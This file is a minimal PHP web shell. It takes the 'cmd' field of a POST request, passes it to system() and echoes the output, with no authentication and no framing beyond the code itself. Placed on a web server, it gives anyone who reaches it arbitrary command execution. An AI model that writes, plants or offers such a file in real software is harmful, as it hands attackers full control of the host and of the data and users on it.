<?php
function execute($com)
{
		if(function_exists('system'))
		{
			echo system($com);
		}
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
echo $buffer;
?>